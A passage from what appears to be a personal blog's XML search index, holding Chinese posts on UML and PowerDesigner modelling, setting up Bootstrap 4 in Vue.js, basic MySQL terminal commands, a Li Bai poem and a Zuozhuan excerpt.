    <title><![CDATA[PowerDesigner使用经验总结]]></title>
    <url>%2F2018%2F05%2F09%2FPowerDesigner%E4%BD%BF%E7%94%A8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[需求分析在系统工程及软件工程中，需求分析指的是在创建一个新的或改变一个现存的系统或产品时，确定新系统的目的、范围、定义和功能时所要做的所有工作。需求分析是软件工程中的一个关键过程。在这个过程中，系统分析员和软件工程师确定顾客的需要。只有在确定了这些需要后他们才能够分析和寻求新系统的解决方法。 在软件工程的历史中，很长时间里人们一直认为需求分析是整个软件工程中最简单的一个步骤，但在过去十年中越来越多的人认识到它是整个过程中最关键的一个过程。假如在需求分析时，分析者们未能正确地认识到顾客的需要的话，那么最后的软件实际上不可能达到顾客的需要，或者软体无法在规定的时间里完工。 软件设计软件设计是从软件需求规格说明书出发，根据需求分析阶段确定的功能设计软件系统的整体结构、划分功能模块、确定每个模块的实现算法以及编写具体的代码，形成软件的具体设计方案。 软件设计是把许多事物和问题抽象起来，并且抽象它们不同的层次和角度。将问题或事物分解并模块化使得解决问题变得容易，分解的越细模块数量也就越多，它的副作用就是使得设计者考虑更多的模块之间耦合度的情况。 UML统一建模语言（英语：Unified Modeling Language，缩写UML）是一种开放的方法，用于说明、可视化、构建和编写一个正在开发的、面向对象的、软件密集系统的制品的开放方法。UML展现了一系列最佳工程实践，这些最佳实践在对大规模，复杂系统进行建模方面，特别是在软件架构层次已经被验证有效。 这个语言由葛来迪·布区，伊瓦尔·雅各布森与詹姆士·兰宝于1994年至1995年间，在Rational Software公司中开发，于1996年，又进一步发展。UML集成了Booch，OMT和面向对象软件工程的概念，将这些方法融合为单一的，通用的，并且可以广泛使用的建模语言。UML打算成为可以对并发和分布式系统的标准建模语言。 在UML系统开发中有三个主要的模型： 功能模型：从用户的角度展示系统的功能，包括用例图。 静态模型：采用对象，属性，操作，关联等概念展示系统的结构和基础，包括类别图、对象图。 动态模型：展现系统的内部行为。包括序列图，活动图，状态图。） PowerDesigner工具PowerDesigner是Sybase的企业建模和设计解决方案，采用模型驱动方法，将业务与IT结合起来，可帮助部署有效的企业体系架构，并为研发生命周期管理提供强大的分析与设计技术。 PowerDesigner独具匠心地将多种标准数据建模技术（UML、业务流程建模以及市场领先的数据建模）集成一体，并与 .NET、WorkSpace、PowerBuilder、Java™、Eclipse 等主流开发平台集成起来，从而为传统的软件开发周期管理提供业务分析和规范的数据库设计解决方案。此外，它支持60多种关系数据库管理系统（RDBMS）／版本[来源请求]。PowerDesigner运行在Microsoft Windows平台上，并提供了Eclipse插件。 PowerDesigner使用经验遵循UML方法，使用PowerDesigner对系统进行建模。 在需求分析阶段，通常使用用例图、序列图（序列图中主要描述用户与系统之间交互关系）、组合结构图、类图（用于描述组件或类的接口及其调用关系）等UML图描述。 在设计阶段，从架构设计、概要设计到详细设计，粒度由粗到细。 通常架构设计是有关软件整体结构与组件的抽象描述，用于指导大型软件系统各个方面的设计。架构设计通常使用组织结构图、对象图、活动图、状态图等UML图描述。 概要设计就是设计软件的结构，包括组成模块，模块的层次结构，模块的调用关系，每个模块的功能等等。同时，还要设计该项目的应用系统的总体数据结构和数据库结构，即应用系统要存储什么数据，这些数据是什么样的结构，它们之间有什么关系。概要设计从模块角度描述系统，通常使用组合结构图进行描述。 详细设计就是为每个模块完成的功能进行具体的描述，要把功能描述转变为精确的、结构化的过程描述。如采用面向对象的开发方法，详细设计通常使用UML类图描述。]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>软件工程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Vue.js集成Bootstrap4]]></title>
    <url>%2F2018%2F05%2F09%2FVue-js%E9%9B%86%E6%88%90Bootstrap4%2F</url>
    <content type="text"><![CDATA[记录在Vue.js中集成Bootstrap4的方法，防止忘了！ 创建Vue.js工程 12npm install -g vue-clivue init webpack project_name 安裝Sass / Sass-loader / node-sass 1npm install sass sass-loader node-sass --save 安裝BootStrap / jQuery / Popper 1npm install bootstrap jquery popper.js --save 配置build/webpack.base.conf.js 123456789101112module.exports = &#123; ... // 新增plugins plugins: [ new webpack.ProvidePlugin(&#123; &apos;$&apos;: &quot;jquery&quot;, &apos;jQuery&apos;: &quot;jquery&quot;, &apos;Popper&apos;: &apos;popper.js&apos; &#125;) ], ...&#125; 在src/main.js中载入Bootstrap 12import &apos;bootstrap&apos;import &apos;bootstrap/dist/css/bootstrap.css&apos; 使用Bootstrap和sass编写Vue.js组件]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>vuejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux MySQL 终端操作]]></title>
    <url>%2F2018%2F05%2F08%2FLinux-MySQL-%E7%BB%88%E7%AB%AF%E6%93%8D%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[进入mysql数据库 1#mysql -uroot -proot 创建mysql user 12MariaDB [(none)]&gt; create user &apos;stock&apos;@&apos;localhost&apos; identified by &apos;stock&apos;;Query OK, 0 rows affected (0.00 sec) 查询mysql用户 12345678MariaDB [(none)]&gt; SELECT User,Host FROM mysql.user;+-------+-----------+| User | Host |+-------+-----------+| root | localhost || stock | localhost |+-------+-----------+2 rows in set (0.00 sec) 授予mysql用户权限 12MariaDB [(none)]&gt; GRANT ALL ON stock.* TO &apos;stock&apos;@&apos;localhost&apos;;Query OK, 0 rows affected (0.00 sec) 使用show语句查找数据库 123456789MariaDB [(none)]&gt; show databases;+--------------------+| Database |+--------------------+| information_schema || mysql || performance_schema |+--------------------+3 rows in set (0.00 sec) 创建数据库stock 12MariaDB [(none)]&gt; create database stock;Query OK, 1 row affected (0.00 sec) 选择创建的数据库 12MariaDB [(none)]&gt; use stock;Database changed 使用show语句查找数据库中的表 1MariaDB [stock]&gt; show tables; 删除创建的数据库 12MariaDB [(none)]&gt; drop database stock;Query OK, 0 rows affected (0.00 sec) 删除表 12mysql&gt; drop table sequelizemeta;Query OK, 0 rows affected (0.01 sec) 查询表结构 1mysql&gt; desc t_records; 清除表记录 1mysql&gt; delete from t_records;]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[侠客行]]></title>
    <url>%2F2018%2F05%2F08%2F%E4%BE%A0%E5%AE%A2%E8%A1%8C%2F</url>
    <content type="text"><![CDATA[作者：李白 赵客缦胡缨，吴钩霜雪明。 银鞍照白马，飒沓如流星。 十步杀一人，千里不留行。 事了拂衣去，深藏身与名。 闲过信陵饮，脱剑膝前横。 将炙啖朱亥，持觞劝侯嬴。 三杯吐然诺，五岳倒为轻。 眼花耳热后，意气素霓生。 救赵挥金锤，邯郸先震惊。 千秋二壮士，烜赫大梁城。 纵死侠骨香，不惭世上英。 谁能书阁下，白首太玄经。]]></content>
      <tags>
        <tag>传统文化</tag>
        <tag>唐诗</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[立功立德立言]]></title>
    <url>%2F2018%2F05%2F08%2F%E7%AB%8B%E5%8A%9F%E7%AB%8B%E5%BE%B7%E7%AB%8B%E8%A8%80%2F</url>
    <content type="text"><![CDATA[来源：《左传》二十四年春，穆叔如晋。范宣子逆之，问焉，曰：“古人有言曰：‘死而不朽’，何谓也？”穆叔未对。宣子曰：“昔匄之祖，自虞以上为陶唐氏，在夏为御龙氏，在商为豕韦氏，在周为唐杜氏，晋主夏盟为范氏，其是之谓乎？”穆叔曰：“以豹所闻，此之谓世禄，非不朽也。鲁有先大夫曰臧文仲，既没，其言立，其是之谓乎！豹闻之，‘太上有立德，其次有立功，其次有立言’，虽久不废，此之谓不朽。若夫保姓受氏，以守宗祊，世不绝祀，无国无之，禄之大者，不可谓不朽。]]></content>
      <tags>
        <tag>传统文化</tag>
        <tag>国学</tag>
      </tags>
  </entry>
</search>
